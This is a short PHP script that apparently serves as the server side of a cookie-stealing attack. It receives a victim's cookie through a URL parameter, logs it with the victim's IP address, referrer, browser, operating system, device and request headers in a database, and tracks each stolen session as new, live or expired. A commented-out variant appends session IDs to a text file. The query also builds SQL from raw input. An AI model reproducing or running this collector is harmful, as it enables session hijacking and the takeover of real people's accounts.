<?php

include("config.php");
include("userinfo.php");

$ip = UserInfo::get_ip();
$cookie = isset($_GET["cookie"]) ? decodeCookie($_GET["cookie"]) : "UnknownCookie";
$referrer = isset($_SERVER["HTTP_REFERER"]) ? $_SERVER["HTTP_REFERER"] : "UnknownReferrer";
$os = isset($_SERVER["HTTP_USER_AGENT"]) ? UserInfo::get_os() : "UnknownOS";
$uashort = isset($_SERVER["HTTP_USER_AGENT"]) ? UserInfo::get_browser() : "UnknownUAShort";
$ualong = isset($_SERVER["HTTP_USER_AGENT"]) ? $_SERVER["HTTP_USER_AGENT"] : "UnknownUALong";
$device = isset($_SERVER["HTTP_USER_AGENT"]) ? UserInfo::get_device() : "UnknownDevice";
$request = getHeaders();
$date = isset($_SERVER["REQUEST_TIME"]) ? date("d.m.Y H:i:s", $_SERVER["REQUEST_TIME"]) : "UnknownDate";
$state = 1; //1 means New, 2 means Live, 3 means Expired.

$query = "insert into cookies values ('', '" . $ip . "', '" . $cookie . "', '" . $referrer . "', '" . $os . "', '" . $uashort . "', '" . $ualong . "', '" . $device . "', '" . $request . "', '" . $date . "', '" . $state . "')";
$rows = $conn->query($query);

if (!$rows) {
    die("Error: " . $conn->error);
}
$conn->close();

// Save sessions to a txt file.
/*$ip = $_SERVER["REMOTE_ADDR"];
$cookie = $_GET["PHPSESSID"];
$file=  fopen("sessions.txt", "a");
fwrite($file, "\n" . $ip . "\t" . $cookie . "\n");
fclose($file);*/

?>

<!DOCTYPE html>
<html lang="en-US">
<head>
    <meta charset="UTF-8">
    <meta name="author" content="Awapt">
    <meta name="description" content="">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
</head>
<body>
</body>
</html>